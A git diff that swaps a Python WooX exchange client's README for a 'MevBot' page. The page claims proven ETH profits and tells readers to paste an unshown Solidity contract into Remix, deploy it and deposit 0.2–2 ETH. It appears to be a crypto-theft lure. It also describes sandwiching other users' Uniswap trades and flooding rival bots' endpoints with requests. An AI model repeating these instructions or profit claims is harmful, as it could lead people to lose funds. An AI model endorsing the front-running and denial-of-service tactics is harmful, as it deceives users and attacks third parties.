@@ -1,74 +1,91 @@
-# Trader Zone
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
-WooX is a zero fee crypto exchange, [click here](https://x.woo.org/register?ref=56LELBCU) to register with my referal code.
 
-Give this package a star if you like it!
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-# Package User Zone
+## For demonstration purposes, other wallets will be used for testing below.
 
-## Installation
 
-```bash
-pip install python-woox
-```
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
 
-## Sample Code
-### Restful Api
-```python
-from woox import Client
-import os
+## Update 08.05.2023 (Result)
 
-API = os.getenv("API")
-SECRET = os.getenv("SECRET")
-APPLICATION_ID = os.getenv("APPLICATION_ID")
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
 
-client = Client(API, SECRET, APPLICATION_ID, testnet=True)
-info = client.get_exchange_info(symbol="SPOT_BTC_USDT")
-print(info)
-```
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
 
-### Websocket
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
 
-```python
-from wootrade import ThreadedWebsocketManager
+The bot sends transactions and monitors the Uniswap v2 Mempool.
 
-def on_read(payload):
-    print(payload)
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
 
-API = os.getenv("API")
-SECRET = os.getenv("SECRET")
-APPLICATION_ID = os.getenv("APPLICATION_ID")
+Finally, the ETH is returned to the contract for withdrawal.
 
-wsm = ThreadedWebsocketManager(API, SECRET, APPLICATION_ID, testnet=True)
-wsm.start()
+This bot performs all of these functions faster than 99% of other bots.
 
-# Un-auth subscribe
-name = 'market_connection'
-wsm.start_socket(on_read, socket_name=name, auth=False)
-wsm.subscribe(name, topic="SPOT_BTC_USDT@kline_1m", id="ClientID", event="subscribe")
+*But ser, there are open source bots that do the same*
 
-# Auth subscribe
-name = 'private_connection'
-wsm.start_socket(on_read, socket_name=name, auth=True)
-wsm.authentication(socket_name=name)
-wsm.subscribe(
-    name,
-    topic="executionreport",
-    id="ClientID",
-    event="subscribe",
-)
-```
-# Developer Zone
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
 
-## Lint
+*Wen increase aggressiveness ?*
 
-```bash
-$ make lint
-```
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
 
-## Test
+*What did I learn?*
 
-```bash
-# Should Set up env variable API, SECRET and APPLICATION_ID in tox.ini
-$ make test 
-```
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
+
+*So why stop?*
+
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
+
+
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
+
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
+
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
+
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
+
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
+
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
+
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
+
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
+
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
+
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
